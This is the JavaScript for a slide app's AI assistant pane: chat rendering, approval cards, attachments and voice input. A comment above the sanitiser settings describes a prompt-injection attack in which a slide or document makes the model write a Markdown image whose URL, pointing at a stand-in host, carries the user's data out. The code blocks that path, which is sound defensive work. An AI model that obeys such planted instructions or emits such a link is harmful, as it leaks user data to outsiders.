// The assistant pane (the right pane; spec 3.2, PJ-4, NL-8, NL-9, NL-11): the project's conversations, the messages
// (the assistant's as Markdown, sanitised: Cortex's renderMarkdown), what it is doing, the cards that wait for the
// person - a question, a plan, proposed instructions, a proposal to review - and the composer (text, images).
// Messages travel over socket.io (core/socket.js: `socket`); conversations over REST.
import { api } from '../core/api.js';
import { html, raw, setHtml } from '../core/html.js';
import * as store from '../core/store.js';
import { tts } from './tts.js';
import { Vad } from './vad.js';

const TOOL_LABELS = {
  list_decks: 'Looking at the decks', list_templates: 'Looking at the templates', create_deck: 'Creating a deck',
  get_deck_outline: 'Reading the outline', get_slide: 'Reading a slide', render_slide: 'Looking at a slide',
  list_layouts: 'Looking at the layouts', update_text: 'Writing text', edit_paragraphs: 'Editing bullets', format_text: 'Formatting text', add_slide: 'Adding a slide',
  duplicate_slide: 'Duplicating a slide', delete_slide: 'Deleting a slide', move_slide: 'Moving a slide',
  change_layout: 'Changing a layout', add_shape: 'Adding a shape', duplicate_shape: 'Copying a shape', connect_shapes: 'Connecting shapes', fit_text: 'Fitting text to its box', fill_slide: 'Writing a slide', add_slides: 'Adding slides', add_chart: 'Making a chart', draw_diagram: 'Drawing a diagram', generate_image: 'Making a picture', generate_deck: 'Reading the source', build_generation: 'Making the deck', edit_chart: 'Changing a chart', move_resize_shape: 'Moving a shape', delete_shape: 'Deleting a shape',
  insert_image: 'Inserting an image', replace_image: 'Replacing an image', set_alt_text: 'Writing alt text', edit_table: 'Editing a table',
  set_notes: 'Writing speaker notes', undo: 'Undoing', redo: 'Redoing',
  kb_search: 'Searching the knowledge base', kb_get: 'Reading a passage', kb_read_document: 'Reading a document',
  kb_list_images: "Looking at a document's pictures", remember: 'Keeping it in the project memory',
  search_conversations: 'Searching earlier conversations', search_project: "Searching the project's documents",
  copy_slides: 'Copying slides from another deck', duplicate_deck: 'Copying a deck',
};
// no pictures, media, frames or forms in a reply: a picture is fetched as soon as the reply is shown, so a document or
// slide that told the model to write ![x](https://elsewhere/?d=<data>) would send that data out (security review M2,
// reproduced in the browser: DOMPurify's defaults keep the picture). Links stay: nothing is sent unless they are opened.
const PURIFY = {
  FORBID_TAGS: ['img', 'picture', 'source', 'video', 'audio', 'iframe', 'object', 'embed', 'form', 'input', 'button', 'style', 'svg'],
  FORBID_ATTR: ['style', 'srcset'],
};
const renderMarkdown = (md) => DOMPurify.sanitize(marked.parse(md || ''), PURIFY);

const root = document.createElement('div');
root.className = 'assistant';
setHtml(root, html`
  <div class="assistant-head">
    <label class="assistant-conv"><span class="visually-hidden">Conversation</span><select aria-label="Conversation"></select></label>
    <button class="cvchat-iconbtn cvchat-speaker head-speaker" type="button" data-action="speaker" aria-pressed="false" title="Spoken replies" aria-label="Spoken replies">${raw('<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M11 5 6 9H2v6h4l5 4V5z"/><path d="M15.5 8.5a5 5 0 0 1 0 7M19 5a9 9 0 0 1 0 14"/></svg>')}</button>
    <button class="cvchat-iconbtn head-speaker" type="button" data-action="hands-free" aria-pressed="false" title="Hands-free: speak without pressing anything" aria-label="Hands-free">${raw('<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 10v4M8 7v10M12 4v16M16 7v10M20 10v4"/></svg>')}</button>
    <button type="button" class="icon-button" data-action="new-conv" title="New conversation" aria-label="New conversation">${raw('<svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" aria-hidden="true"><path d="M12 5v14M5 12h14"/></svg>')}</button>
  </div>
  <div class="chat-log" role="log" aria-live="polite"></div>
  <div class="hands-free-bar" role="status" hidden><span class="hands-free-dot" aria-hidden="true"></span><span class="hands-free-text"></span>
    <button type="button" data-action="hands-free-off">Turn off</button></div>
  <div class="assistant-status" aria-live="polite"></div>
  <div class="attachments" hidden></div>
  <form class="cvchat-inputbar">
    <button class="cvchat-iconbtn" type="button" data-action="attach" title="Attach an image" aria-label="Attach an image">${raw('<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21.4 11.1 12.2 20.3a6 6 0 0 1-8.5-8.5l9.2-9.2a4 4 0 0 1 5.7 5.7l-9.2 9.2a2 2 0 0 1-2.8-2.8l8.5-8.5"/></svg>')}</button>
    <button class="cvchat-iconbtn cvchat-mic" type="button" data-action="mic" aria-pressed="false" title="Speak (hold, or press to start and again to finish; Alt+V)" aria-label="Speak">${raw('<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2"/><path d="M12 19v4M8 23h8"/></svg>')}</button>
    <textarea class="cvchat-input" rows="1" maxlength="8000" placeholder="Ask the assistant…"></textarea>
    <button class="cvchat-iconbtn" type="button" data-action="stop" title="Stop" aria-label="Stop" hidden>${raw('<svg viewBox="0 0 24 24" fill="currentColor"><rect x="6" y="6" width="12" height="12" rx="2"/></svg>')}</button>
    <button class="cvchat-iconbtn cvchat-send" type="submit" aria-label="Send">${raw('<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 2 11 13M22 2l-7 20-4-9-9-4 20-7z"/></svg>')}</button>
  </form>`);

const log = root.querySelector('.chat-log');
const status = root.querySelector('.assistant-status');
const select = root.querySelector('select');
const input = root.querySelector('textarea');
const form = root.querySelector('form');
const stopBtn = root.querySelector('[data-action="stop"]');
const attachBar = root.querySelector('.attachments');
let lastSeq = 0;
let streaming = null;           // the bubble the current answer streams into
let attachments = [];           // [{id, name}]
let busy = false;

function setBusy(on, text = '') {
  busy = on;
  stopBtn.hidden = !on;
  form.querySelector('.cvchat-send').disabled = on;
  status.textContent = text;
}

function scroll() { log.scrollTop = log.scrollHeight; }

function bubble(kind, markup) {
  const el = document.createElement('div');
  el.className = `chat-msg ${kind}`;
  if (markup !== undefined) el.innerHTML = markup;
  log.append(el);
  scroll();
  return el;
}

function showMessage(m) {
  if (m.seq) lastSeq = Math.max(lastSeq, m.seq);
  if (m.role === 'user') {
    const el = bubble('me');
    el.classList.add('user-text');
    el.textContent = m.content;
    // a shared project's conversation shows who wrote each message (spec PJ-13): another member's, by address
    const author = (m.author || '').toLowerCase();
    if (author && author !== (window.__user?.email || '').toLowerCase()) {
      el.prepend(Object.assign(document.createElement('div'), { className: 'chat-author notranslate', textContent: author }));
    }
    if (m.attachments?.length) el.append(Object.assign(document.createElement('div'), { className: 'chat-attach', textContent: `🖼 ${m.attachments.length}` }));
  } else if (m.role === 'assistant' && (m.content || '').trim()) {
    const el = bubble('bot', renderMarkdown(m.content));
    el.querySelector('*')?.classList.add('user-text');
    el.classList.add('user-text');
    notice(m);
    sources(m);
  }
}

// spec KB-3: the knowledge-base sources the reply drew on, each opening in Cortex (behind its sign-in)
function sources(m) {
  if (!m.sources?.length) return;
  const el = document.createElement('details');
  el.className = 'chat-sources';
  // a section path ("Document > Part > Section") by its last heading: the full path repeats the title
  const where = (x) => [...(x.sections || []).map((t) => t.split(' > ').pop()), (x.pages || []).length ? `p. ${x.pages.join(', ')}` : '', (x.updated || '').slice(0, 10)]
    .filter(Boolean).join(' · ');
  setHtml(el, html`<summary>Sources (${m.sources.length})</summary>
    <ul>${m.sources.map((x) => html`<li>${x.link
      ? html`<a class="notranslate" href="${x.link}" target="_blank" rel="noopener noreferrer">${x.title || x.document}</a>`
      : html`<span class="notranslate">${x.title || x.document}</span>`}
      <small class="notranslate">${where(x)}</small></li>`)}</ul>`);
  log.append(el);
  scroll();
}

// what the application knows whatever the reply says: the turn's edits all failed, so nothing changed
function notice(m) {
  if (m.notice !== 'nothing_changed') return;
  const el = bubble('err');
  el.textContent = 'Nothing was changed: the assistant\'s edits failed. Ask again, perhaps in other words.';
}

// ── the cards that wait for the person ──────────────────────────────
function card(kind, body) {
  log.querySelectorAll(`.chat-card.${kind}`).forEach((c) => c.remove());
  const el = document.createElement('div');
  el.className = `chat-card ${kind}`;
  setHtml(el, body);
  log.append(el);
  scroll();
  return el;
}

function questionCard(q) {
  const el = card('question', html`<p class="user-text">${q.question}</p>
    ${q.options?.length ? html`<div class="row">${q.options.map((o) => html`<button type="button" class="secondary" data-answer="${o}"><span class="user-text">${o}</span></button>`)}</div>` : ''}
    <p class="muted">Or type your answer below.</p>`);
  el.querySelectorAll('[data-answer]').forEach((b) => b.addEventListener('click', () => answer({ answer: b.dataset.answer })));
}

function planCard(p) {
  // a generated deck's plan (generate_deck): its outline opens in the generation's page, to be changed before the slides
  const el = card('plan', html`<h3>Plan</h3><ol class="user-text">${p.steps.map((s) => html`<li>${s}</li>`)}</ol>
    <div class="row"><button type="button" class="primary" data-approve="1">Go ahead</button>
    ${p.generation_id ? html`<button type="button" class="secondary" data-outline>Edit the outline</button>` : ''}
    <button type="button" data-approve="0">Don't</button></div>`);
  el.querySelectorAll('[data-approve]').forEach((b) => b.addEventListener('click', () => answer({ approve: b.dataset.approve === '1' })));
  el.querySelector('[data-outline]')?.addEventListener('click', () => document.dispatchEvent(new CustomEvent('sa:open-generation', { detail: { id: p.generation_id } })));
}

function instructionsCard(p) {
  const el = card('instructions', html`<h3>New project instructions</h3>
    <p class="muted">They apply to every deck and conversation of this project.</p>
    <pre class="user-text instructions-text">${p.text}</pre>
    <div class="row"><button type="button" class="primary" data-accept="1">Save them</button><button type="button" data-accept="0">Don't</button></div>`);
  el.querySelectorAll('[data-accept]').forEach((b) => b.addEventListener('click', () => answer({ accept: b.dataset.accept === '1' })));
}

function proposalCard(p) {
  if (!p || p.status !== 'pending') { log.querySelectorAll('.chat-card.proposal').forEach((c) => c.remove()); return; }
  const count = Object.values(p.decks).reduce((n, d) => n + d.slides.length, 0);
  const el = card('proposal', html`<h3>Changes to review</h3>
    <p>${count === 1 ? '1 slide changed' : `${count} slides changed`}. Nothing is saved until you accept.</p>
    <div class="row"><button type="button" class="secondary" data-review>Review</button>
    <button type="button" class="primary" data-accept="1">Accept all</button><button type="button" data-accept="0">Reject all</button></div>`);
  el.querySelector('[data-review]').addEventListener('click', () => {
    const did = Object.keys(p.decks)[0];
    document.dispatchEvent(new CustomEvent('sa:review', { detail: { deck: did } }));
  });
  el.querySelectorAll('[data-accept]').forEach((b) => b.addEventListener('click', () => decide(p, b.dataset.accept === '1')));
}

// ── talking to the server ───────────────────────────────────────────
function ids() { return { project_id: store.get('project'), conversation_id: store.get('conversation') }; }

async function answer(decision) {
  const cards = [...log.querySelectorAll('.chat-card.question, .chat-card.plan, .chat-card.instructions')];
  cards.forEach((c) => { c.hidden = true; });
  setBusy(true, 'Working…');
  const r = await socket.emitWithAck('answer', { ...ids(), ...decision });
  if (r.ok) { cards.forEach((c) => c.remove()); return; }
  // refused (a viewer: security review L7): the question stays for an editor to answer
  cards.forEach((c) => { c.hidden = false; });
  setBusy(false);
  bubble('err').textContent = r.error;
}

export async function decide(p, accept, slides = null) {
  const r = await socket.emitWithAck('proposal_decision', { ...ids(), proposal_id: p.id, accept, slides });
  if (!r.ok) { modalAlert(r.error, { title: 'Changes' }); return; }
  window.menus.toast(accept ? (r.status === 'stale' ? 'The deck changed meanwhile: ask again.' : 'The changes were saved.') : 'The changes were discarded.');
}

form.addEventListener('submit', async (e) => {
  e.preventDefault();
  const text = input.value.trim();
  if (!text || busy) return;
  if (!store.get('conversation')) await newConversation();
  input.value = '';
  setBusy(true, 'Working…');
  const r = await socket.emitWithAck('user_message', { ...ids(), text, deck_id: store.get('deck'), selection: store.get('selection'),
    attachments: attachments.map((a) => a.id) });
  attachments = [];
  renderAttachments();
  if (!r.ok) { setBusy(false); bubble('err').textContent = r.error; return; }
  if (select.selectedOptions[0] && !select.selectedOptions[0].classList.contains('notranslate')) refreshTitles();
});
input.addEventListener('keydown', (e) => { if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); form.requestSubmit(); } });
stopBtn.addEventListener('click', () => socket.emit('cancel_turn', ids()));

root.querySelector('[data-action="attach"]').addEventListener('click', () => {
  const pick = Object.assign(document.createElement('input'), { type: 'file', accept: 'image/png,image/jpeg,image/webp' });
  pick.addEventListener('change', async () => {
    const file = pick.files[0];
    if (!file) return;
    const form = new FormData();
    form.append('kind', 'image');
    form.append('file', file);
    try {
      const asset = await api(`projects/${store.get('project')}/assets`, { method: 'POST', form });
      attachments.push({ id: asset.id, name: asset.name });
      renderAttachments();
    } catch (err) { modalAlert(err.message, { title: 'Attach an image' }); }
  }, { once: true });
  pick.click();
});

function renderAttachments() {
  attachBar.hidden = !attachments.length;
  setHtml(attachBar, html`${attachments.map((a) => html`<span class="pill user-text">🖼 ${a.name}</span>`)}`);
}

// ── voice (technical design section 7; spec VO-1, VO-3, VO-4) ────────
// spoken replies: on or off, remembered in this browser; off at first (reading every reply aloud is a choice)
const speaker = root.querySelector('[data-action="speaker"]');
let speakOn = false;
try { speakOn = localStorage.getItem('slides.speak') === '1'; } catch { /* storage unavailable: off */ }
const setSpeaker = (on) => { speakOn = on; speaker.classList.toggle('active', on); speaker.setAttribute('aria-pressed', String(on)); };
setSpeaker(speakOn);
speaker.addEventListener('click', () => {
  setSpeaker(!speakOn);
  try { localStorage.setItem('slides.speak', speakOn ? '1' : '0'); } catch { /* not kept */ }
  if (speakOn) tts.unlock(); else tts.stop();
});
tts.onState = (state, message) => {
  speaker.classList.toggle('speaking', state === 'speaking');
  if (state === 'error') status.textContent = message;
};

// the microphone: hold to talk, or press to start and press again to finish (Alt+V the same); the words come back
// as voice_text, into the composer, to be checked before sending. Pressing it stops a reply being read (barge-in).
const mic = root.querySelector('[data-action="mic"]');
const MAX_MS = 120_000;   // the server refuses longer (speech.py MAX_SECONDS)
const voice = { stream: null, ctx: null, node: null, starting: null, pressedAt: 0, timer: null };
function release() {
  if (voice.node) voice.node.port.onmessage = null;
  voice.stream?.getTracks().forEach((t) => t.stop());
  voice.ctx?.close();
  clearTimeout(voice.timer);
  Object.assign(voice, { stream: null, ctx: null, node: null, timer: null });
  mic.classList.remove('active');
  mic.setAttribute('aria-pressed', 'false');
}
// the worklet's code fetched like any of the page's files, then loaded from memory: a worklet's own request is made
// without what the page's requests carry (measured: 401 where the identity comes with each request)
let worklet = null;
async function workletUrl() {
  if (!worklet) {
    const r = await fetch(new URL('./pcm-worklet.js', import.meta.url));
    if (!r.ok) throw new Error(`HTTP ${r.status}`);
    worklet = URL.createObjectURL(new Blob([await r.text()], { type: 'text/javascript' }));
  }
  return worklet;
}

async function micStart() {
  if (hands.on) handsOff();                            // pressing the microphone takes over from hands-free
  if (voice.stream || voice.starting || !store.get('project')) return;
  tts.stop();                                          // barge-in
  if (speakOn) tts.unlock();
  voice.starting = (async () => {
    try {
      voice.stream = await navigator.mediaDevices.getUserMedia({ audio: { channelCount: 1, echoCancellation: true, noiseSuppression: true, autoGainControl: true } });
      voice.ctx = new AudioContext();
      await voice.ctx.audioWorklet.addModule(await workletUrl());
    } catch (e) {
      release();
      status.textContent = `The microphone is unavailable: ${e.message}`;
      return;
    }
    const r = await socket.emitWithAck('voice_begin', { project_id: store.get('project'), deck_id: store.get('deck'), language: window.uiLanguage() });
    if (!r?.ok) { release(); status.textContent = r?.error || 'The microphone could not start.'; return; }
    const src = voice.ctx.createMediaStreamSource(voice.stream);
    voice.node = new AudioWorkletNode(voice.ctx, 'pcm-resampler');
    const mute = voice.ctx.createGain();
    mute.gain.value = 0;
    voice.node.port.onmessage = (e) => socket.emit('voice_audio', e.data);
    src.connect(voice.node).connect(mute).connect(voice.ctx.destination);
    mic.classList.add('active');
    mic.setAttribute('aria-pressed', 'true');
    status.textContent = 'Listening… press again (or let go) to finish.';
    voice.timer = setTimeout(micStop, MAX_MS);
  })();
  await voice.starting;
  voice.starting = null;
}
async function micStop() {
  if (voice.starting) await voice.starting;
  if (!voice.stream) return;
  release();
  status.textContent = 'Transcribing…';
  socket.emit('voice_end', {});
}
mic.addEventListener('pointerdown', (e) => {
  e.preventDefault();
  if (voice.stream) { micStop(); return; }           // the second press of press-to-start
  voice.pressedAt = performance.now();
  micStart();
});
mic.addEventListener('pointerup', () => {            // held: letting go finishes; a short press keeps listening
  if (performance.now() - voice.pressedAt > 600) micStop();
});
document.addEventListener('keydown', (e) => {
  if (e.altKey && !e.ctrlKey && !e.metaKey && e.code === 'KeyV' && root.isConnected && root.offsetParent) {
    e.preventDefault();
    if (voice.stream) micStop(); else micStart();
  }
});
socket.on('voice_text', (m) => {
  if (hands.on && hands.expecting) {                  // hands-free: what was said is sent as it is
    hands.expecting = false;
    if (m.error || !m.text) { handsState(); return; }
    input.value = m.text;
    form.requestSubmit();
    handsState();
    return;
  }
  if (m.error) { status.textContent = m.error; return; }
  if (!m.text) { status.textContent = 'No speech was recognised.'; return; }
  status.textContent = '';
  input.value = input.value.trim() ? `${input.value.trimEnd()} ${m.text}` : m.text;
  input.focus();
});

// hands-free (spec VO-2): the microphone stays open and vad.js finds where each request starts and ends; each is
// transcribed with the same events as the microphone button and sent as it is. It does not listen while the assistant
// works or speaks (its own voice is not a request), and the bar above the composer always says that it is on.
const handsBtn = root.querySelector('[data-action="hands-free"]');
const handsBar = root.querySelector('.hands-free-bar');
const hands = { on: false, stream: null, ctx: null, node: null, vad: null, utter: null, expecting: false, heard: false };
const handsPaused = () => busy || tts.speaking() || hands.expecting;
function handsState() {
  handsBar.hidden = !hands.on;
  handsBtn.classList.toggle('active', hands.on);
  handsBtn.setAttribute('aria-pressed', String(hands.on));
  if (!hands.on) return;
  const text = hands.utter ? 'Hands-free on · hearing you' : hands.expecting ? 'Hands-free on · transcribing'
    : handsPaused() ? 'Hands-free on · waiting for the assistant' : 'Hands-free on · listening';
  handsBar.querySelector('.hands-free-text').textContent = text;
  handsBar.classList.toggle('hearing', Boolean(hands.utter));
}
function handsOff() {
  if (hands.node) hands.node.port.onmessage = null;
  hands.stream?.getTracks().forEach((t) => t.stop());
  hands.ctx?.close();
  if (hands.utter?.ready) socket.emit('voice_cancel', {});   // half a request is not sent: it is dropped unheard
  Object.assign(hands, { on: false, stream: null, ctx: null, node: null, vad: null, utter: null, expecting: false });
  handsState();
}
async function handsOn() {
  if (hands.on || !store.get('project')) return;
  if (voice.stream) await micStop();
  if (speakOn) tts.unlock();
  try {
    hands.stream = await navigator.mediaDevices.getUserMedia({ audio: { channelCount: 1, echoCancellation: true, noiseSuppression: true, autoGainControl: true } });
    hands.ctx = new AudioContext();
    await hands.ctx.audioWorklet.addModule(await workletUrl());
  } catch (e) {
    handsOff();
    status.textContent = `The microphone is unavailable: ${e.message}`;
    return;
  }
  const send = (u, pcm) => socket.emit('voice_audio', pcm.buffer.byteLength === pcm.byteLength ? pcm.buffer : pcm.slice().buffer);
  hands.vad = new Vad({
    onStart: (pre) => {
      const u = { ready: false, ended: false, queue: [...pre] };
      hands.utter = u;
      handsState();
      socket.emitWithAck('voice_begin', { project_id: store.get('project'), deck_id: store.get('deck'), language: window.uiLanguage() }).then((r) => {
        if (hands.utter !== u && !u.ended) return;
        if (!r?.ok) { hands.utter = null; status.textContent = r?.error || 'The microphone could not start.'; handsState(); return; }
        u.queue.forEach((pcm) => send(u, pcm));
        u.queue = [];
        u.ready = true;
        if (u.ended) socket.emit('voice_end', {});
      });
    },
    onAudio: (pcm) => { const u = hands.utter; if (!u) return; if (u.ready) send(u, pcm); else u.queue.push(pcm); },
    onEnd: () => {
      const u = hands.utter;
      hands.utter = null;
      if (!u) return;
      u.ended = true;
      hands.expecting = true;
      if (u.ready) socket.emit('voice_end', {});
      handsState();
    },
  });
  const src = hands.ctx.createMediaStreamSource(hands.stream);
  hands.node = new AudioWorkletNode(hands.ctx, 'pcm-resampler');
  const mute = hands.ctx.createGain();
  mute.gain.value = 0;
  hands.node.port.onmessage = (e) => {
    if (!hands.utter && handsPaused()) { hands.vad.reset(); handsState(); return; }
    hands.vad.feed(new Int16Array(e.data));
    if (!hands.utter) handsState();
  };
  src.connect(hands.node).connect(mute).connect(hands.ctx.destination);
  hands.on = true;
  handsState();
}
handsBtn.addEventListener('click', () => (hands.on ? handsOff() : handsOn()));
handsBar.querySelector('[data-action="hands-free-off"]').addEventListener('click', handsOff);
window.slidesHandsFree = hands;   // the browser checks look at it

// ── conversations ───────────────────────────────────────────────────
// the picker's options: a conversation's title is what its first message said (never translated); untitled, the label
function renderOptions(conversations) {
  setHtml(select, html`${conversations.map((c) => (c.title ? html`<option class="notranslate" value="${c.id}">${c.title}</option>` : html`<option value="${c.id}">New conversation</option>`))}<option value="">— New conversation —</option>`);
}

// after a message: the server may have just named the conversation; the picker shows it, the log stays as it is
async function refreshTitles() {
  const pid = store.get('project');
  if (!pid) return;
  const keep = select.value;
  try { renderOptions((await api(`projects/${pid}/conversations`)).conversations); } catch { return; }
  select.value = keep;
}

async function loadConversations(selectId = null) {
  const pid = store.get('project');
  if (!pid) return;
  const { conversations } = await api(`projects/${pid}/conversations`);
  renderOptions(conversations);
  const id = selectId || store.get('conversation') || conversations[0]?.id || '';
  select.value = conversations.some((c) => c.id === id) ? id : (conversations[0]?.id || '');
  if (select.value) join(select.value);
  else { store.set('conversation', null); log.replaceChildren(); }
}

export async function newConversation() {
  const c = await api(`projects/${store.get('project')}/conversations`, { method: 'POST', json: { deck_id: store.get('deck') } });
  await loadConversations(c.id);
  return c;
}

async function join(cid) {
  store.set('conversation', cid);
  log.replaceChildren();
  lastSeq = 0;
  const r = await socket.emitWithAck('join_conversation', { project_id: store.get('project'), conversation_id: cid });
  if (!r.ok) { bubble('err').textContent = r.error; return; }
  for (const m of r.messages) showMessage(m);
  const pending = r.conversation.pending;
  if (pending?.kind === 'question') questionCard(pending.payload);
  if (pending?.kind === 'plan') planCard(pending.payload);
  if (pending?.kind === 'instructions') instructionsCard(pending.payload);
  store.set('proposal', r.proposal);
  proposalCard(r.proposal);
  setBusy(r.busy, r.busy ? 'Working…' : '');
}

select.addEventListener('change', () => { if (select.value) join(select.value); else newConversation(); });
root.querySelector('[data-action="new-conv"]').addEventListener('click', () => newConversation());

// ── what the server says ────────────────────────────────────────────
const mine = (d) => d && d.conversation_id === store.get('conversation');
socket.on('message', (m) => { if (mine(m) && m.role === 'user' && m.seq > lastSeq) showMessage(m); else if (mine(m)) lastSeq = Math.max(lastSeq, m.seq || 0); });
socket.on('turn_started', (d) => { if (mine(d)) setBusy(true, 'Working…'); });
socket.on('assistant_delta', (d) => {
  if (!mine(d)) return;
  if (!streaming) { streaming = bubble('bot'); streaming.dataset.text = ''; streaming.classList.add('user-text'); }
  streaming.dataset.text += d.text;
  streaming.innerHTML = renderMarkdown(streaming.dataset.text);
  scroll();
});
socket.on('assistant_message', (m) => {
  if (!mine(m)) return;
  if (speakOn && m.speakable) tts.speak(m.speakable, window.uiLanguage());   // spec VO-3: the short version
  if (streaming) { streaming.innerHTML = renderMarkdown(m.content); streaming = null; notice(m); sources(m); } else showMessage(m);
  lastSeq = Math.max(lastSeq, m.seq || 0);
  document.dispatchEvent(new CustomEvent('sa:assistant-reply', { detail: m }));
});
socket.on('tool_progress', (d) => { if (mine(d)) { streaming = null; status.textContent = `${d.detail || TOOL_LABELS[d.tool] || 'Working'}…`; } });
socket.on('question', (d) => { if (mine(d)) { streaming = null; questionCard(d); } });
socket.on('plan', (d) => { if (mine(d)) { streaming = null; planCard(d); } });
socket.on('instructions_proposed', (d) => { if (mine(d)) { streaming = null; instructionsCard(d); } });
socket.on('instructions_changed', (d) => { if (mine(d)) document.dispatchEvent(new CustomEvent('sa:project-changed')); });
socket.on('proposal_updated', (p) => {
  if (!mine(p)) return;
  store.set('proposal', p.status === 'pending' ? p : null);
  proposalCard(p);
});
socket.on('deck_changed', (d) => { if (mine(d)) document.dispatchEvent(new CustomEvent('sa:deck-changed', { detail: d })); });
socket.on('turn_ended', (d) => { if (mine(d)) { streaming = null; setBusy(false, d.status === 'waiting' ? 'Waiting for your answer.' : d.status === 'cancelled' ? 'Stopped.' : ''); } });
socket.on('assistant_error', (d) => { if (mine(d)) { streaming = null; setBusy(false); bubble('err').textContent = d.message; } });
socket.on('connect', () => { if (store.get('conversation')) join(store.get('conversation')); });

store.on('project', () => loadConversations());
store.on('proposal', (p) => proposalCard(p));

window.rightPane.add('assistant', { label: 'Assistant', element: root });
export function showAssistant() { window.rightPane.show('assistant'); }
